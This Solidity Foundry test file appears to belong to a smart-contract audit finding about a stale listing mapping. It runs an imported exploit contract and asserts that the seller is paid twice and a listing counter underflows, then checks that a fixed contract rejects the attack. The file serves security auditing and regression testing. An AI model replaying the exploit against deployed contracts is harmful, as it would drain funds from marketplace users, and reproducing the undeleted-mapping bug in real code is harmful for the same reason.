// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, CollectionToken, NFT, Locker, ListingsFixed, Actor} from
    "./41747-h-9-listing-mapping-not-deleted-when-calling-listingsreserv.sol";

contract Finding41747Test is Test {
    function test_exploit_stale_listing_pays_seller_twice() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.nft().ownerOf(e.TOKEN_ID()), address(e), "buyer got nft");
        assertEq(e.sellerBalance(), 0.4 ether, "paid twice");
        assertEq(e.reserverBalance(), 8.8 ether, "reserver paid 1.2");
        assertEq(e.count(), type(uint256).max, "listingCount underflow");
    }

    function test_control_deleted_listing_cannot_be_filled() public {
        CollectionToken collection = new CollectionToken();
        NFT nft = new NFT();
        Locker locker = new Locker();
        ListingsFixed listings = new ListingsFixed(collection, nft, locker);
        Actor userA = new Actor();
        Actor userB = new Actor();
        nft.setOperator(address(listings));
        nft.mint(address(userA), 1199);
        userA.approveNft(nft, address(listings), 1199);
        userA.call(address(listings), abi.encodeWithSignature("createListing(uint256,uint256)", 1199, 120));
        collection.mint(address(userB), 10 ether);
        userB.approveToken(collection, address(listings), 10 ether);
        userB.call(address(listings), abi.encodeWithSignature("reserve(uint256)", 1199));
        userB.call(address(listings), abi.encodeWithSignature("unlockProtectedListing(uint256,bool)", 1199, false));
        collection.mint(address(this), 10 ether);
        collection.approve(address(listings), 10 ether);
        vm.expectRevert(bytes("list"));
        listings.fillListings(1199);
        assertEq(collection.balanceOf(address(userA)), 0.2 ether, "one premium");
        assertEq(nft.ownerOf(1199), address(locker), "nft stays");
    }
}
